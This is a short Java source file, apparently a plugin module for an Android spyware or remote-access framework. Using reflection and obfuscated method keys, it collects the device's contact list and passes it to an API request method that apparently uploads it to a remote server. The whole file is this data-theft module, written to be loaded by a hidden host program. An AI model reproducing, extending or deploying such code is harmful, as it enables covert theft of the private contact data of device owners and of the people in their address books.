package com.moonny.mods_src;

import org.json.JSONObject;

import java.lang.reflect.Method;
import java.util.HashMap;

public class Get_contacts {

    public int MAIN_VER_REQUIRED = 100; // minimum Main api version required
    private Object mods;
    private Method run_func;
    private Method api_request;

    public Get_contacts(HashMap<String, Object> system) throws Exception
    {
        this.mods = system.get("a4");
        this.run_func = mods.getClass().getDeclaredMethod((String) system.get("a5"), String.class, String.class, Object[].class);
        this.api_request = mods.getClass().getDeclaredMethod((String) system.get("a7"), JSONObject.class, String.class, String.class);
    }

    public JSONObject run(JSONObject params) throws Exception {

        JSONObject contacts = (JSONObject) run_func.invoke(mods, "main", "get_contacts", new Object[]{});

        JSONObject json = new JSONObject();
        json.put("m", "x");
        json.put("1", contacts);

        api_request.invoke(mods, json, "", "");
        return null;
    }

}
